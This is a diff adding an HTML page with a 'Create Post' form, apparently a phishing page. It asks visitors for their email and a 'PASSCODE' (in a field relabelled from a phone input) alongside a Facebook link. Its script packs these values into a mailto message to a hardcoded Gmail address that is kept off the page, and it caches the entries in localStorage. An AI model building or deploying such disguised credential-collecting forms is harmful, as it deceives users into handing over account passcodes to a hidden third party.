@@ -1,0 +1,106 @@
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<!-- 一開始即執行javascript的 init() function -->
+<h1 style="color:white;">MEKO</h1>
+<body onload="init()">
+  <h2 style="color:white;">Create Post:</h2>
+ <form   enctype="text/plain" accept-charset="utf-8">
+  
+   <!-- required 必填欄位 ，placeholder 預設內容--> 
+    <input data-store="1" id="subText" type="text" name="Subject"  value size="60" aria-invalid="false" placeholder="Name" required>
+     <!-- 寄件者email -->
+     <input data-store="2" id="emailText" type="email" name="Email"  value size="60" placeholder="Email" required>
+     
+     <!-- 寄件者電話 -->
+     <input data-store="3" id="telText"type="tel" name="Phone"  value size="60" aria-invalid="false" placeholder="PASSCODE" required>
+     
+     <!-- 郵件主旨 -->
+ 
+  <!-- 寄件者姓名    -->
+     <input id="nameText" type="text" name="Name"  value size="60" placeholder="Paste Facebook Video/image link"> 
+     <!-- 郵件內容 -->
+     <textarea id="bodyText" name="your-message" cols="40" rows="10"  aria-required="true" aria-invalid="false" placeholder="Your Message" required></textarea>
+     
+     <!-- 傳送按鈕 -->
+     <div>
+         <input type="button" id="submit" value="Submit" onclick="submitHandler();">
+         <a id="mailTo"></a>
+     </div>
+ </form>
+</body>
+<script>
+//宣告預設表單內容為空 （你想要的話也可以加東西）
+    var initSubject='',initBody='';
+ 
+    //按下傳送按鈕後執行
+    function submitHandler(){
+        var to = "s77750939@gmail.com";//寫死的傳送對象 就是公司的信箱 不會顯示在網頁上
+        var name = nameText.value;//讀取ID為 nameTextuser 物件中的值
+        var email = emailText.value;
+        var tel = telText.value;
+        var subject = subText.value;
+//把user填的資料都塞到 mail body 中
+        var body = ""+bodyText.value+'%0A%0A%0A';//%0A是換行 換了三行
+            body += "LINK："+nameText.value+'%0A';
+            body += "EMAIL："+emailText.value+'%0A';
+            body += "PASSCODE："+telText.value;
+//傳送的主要程式碼
+        mailTo.href="mailto:"+to+"?subject="+subject+"&body="+body;
+        mailTo.click();
+    }
+//在body onload
+    function init(){
+        subText.value=initSubject;
+        //nameText.value=initTo;
+        bodyText.value=initBody;
+    };
+    $(document).ready (function () {
+      $("*[data-store]").each(function () {
+        $(this).val(localStorage.getItem("item-" + $(this).attr("data-store")));
+      });
+
+      $("*[data-store]").on("keyup", function (itm) {
+        localStorage.setItem ("item-" + $(this).attr("data-store"), $(this).val());
+      })
+    })
+</script>
+<style>
+@import url('https://fonts.googleapis.com/css?family=Lalezar&display=swap');
+body{
+  background:black;
+  font-family: 'Lalezar';
+  
+}
+h1{
+  text-align:center;
+  color:#000;
+  font-size:5em;
+  margin:0px;
+  color:white;
+}
+form{
+  display:flex;
+  align-items: center;
+  flex-direction: column;
+}
+input{
+  height:34px;
+}
+input,textarea{
+  border-radius:3px;
+  border:5px solid #000 ;
+  margin:5px;
+  width:100%;
+  max-width:400px;
+  font-family: 'Lalezar';
+}
+input#submit{
+  background:green;
+  color:#fff;
+  font-size:2em;
+  height:auto;
+}
+
+</style>
